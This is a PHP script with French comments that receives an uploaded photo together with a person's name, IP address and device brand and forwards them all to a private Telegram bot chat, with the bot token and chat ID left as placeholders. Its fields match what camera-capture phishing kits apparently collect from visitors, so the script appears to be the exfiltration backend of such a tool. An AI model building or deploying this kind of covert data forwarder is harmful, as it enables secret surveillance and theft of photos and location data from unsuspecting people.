<?php
header('Content-Type: application/json');

// Jeton du bot Telegram
$botToken = "votre api telegram";
// Chat ID où envoyer les données
$chatId = "votre Id chat";

// Fichier de log
$logFile = 'log.txt';

// Fonction pour écrire les logs dans le fichier
function logMessage($message) {
    global $logFile;
    error_log(date('[Y-m-d H:i:s] ') . $message . "\n", 3, $logFile);
}

// Vérifier si le fichier a bien été reçu
if (isset($_FILES['photo']) && $_FILES['photo']['error'] === UPLOAD_ERR_OK) {
    $photoPath = $_FILES['photo']['tmp_name'];

    // Vérification du chemin du fichier photo
    $realPath = realpath($photoPath);
    if ($realPath === false) {
        logMessage('Erreur: le fichier photo est introuvable.');
        echo json_encode(['status' => 'error', 'message' => 'Erreur: le fichier photo est introuvable.']);
        exit;
    }
    logMessage('Fichier photo trouvé à: ' . $realPath);

    // Préparer les données pour Telegram
    $caption = "👤 *Données reçues :*\n📛 *Nom :* " . ($_POST['name'] ?? 'Inconnu') . "\n🌐 *IP :* " . ($_POST['ip'] ?? 'Non disponible') . "\n📱 *Appareil :* " . ($_POST['deviceBrand'] ?? 'Non spécifié');

    $url = "https://api.telegram.org/bot$botToken/sendPhoto";
    
    // Préparer les données du formulaire
    $data = [
        'chat_id' => $chatId,
        'caption' => $caption,
        'parse_mode' => 'Markdown',
        'photo' => new CURLFile($realPath) // Utilisation du chemin absolu du fichier
    ];

    // Initialisation de cURL
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);

    // Activer les logs pour cURL
    curl_setopt($ch, CURLOPT_VERBOSE, true);
    $response = curl_exec($ch);

    // Vérification des erreurs cURL
    if (curl_errno($ch)) {
        logMessage('Erreur cURL: ' . curl_error($ch));
        echo json_encode(['status' => 'error', 'message' => 'Erreur cURL: ' . curl_error($ch)]);
        curl_close($ch);
        exit;
    }

    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    // Vérification du code HTTP
    if ($httpCode === 200) {
        logMessage('Photo envoyée à Telegram avec succès.');
        echo json_encode(['status' => 'success', 'message' => 'Photo envoyée à Telegram.']);
    } else {
        logMessage('Échec d\'envoi de la photo, code HTTP: ' . $httpCode);
        echo json_encode(['status' => 'error', 'message' => 'Échec d\'envoi de la photo, code HTTP: ' . $httpCode]);
    }
} else {
    // Envoi uniquement des données textuelles si la photo est absente
    $text = "👤 *Données reçues :*\n📛 *Nom :* " . ($_POST['name'] ?? 'Inconnu') . "\n🌐 *IP :* " . ($_POST['ip'] ?? 'Non disponible') . "\n📱 *Appareil :* " . ($_POST['deviceBrand'] ?? 'Non spécifié');
    
    // Envoi du message texte à Telegram
    $response = file_get_contents("https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=" . urlencode($text) . "&parse_mode=Markdown");

    if ($response === FALSE) {
        logMessage('Erreur lors de l\'envoi du message texte à Telegram.');
        echo json_encode(['status' => 'error', 'message' => 'Erreur lors de l\'envoi du message texte à Telegram.']);
    } else {
        logMessage('Données texte envoyées à Telegram avec succès.');
        echo json_encode(['status' => 'success', 'message' => 'Données texte envoyées à Telegram.']);
    }
}
?>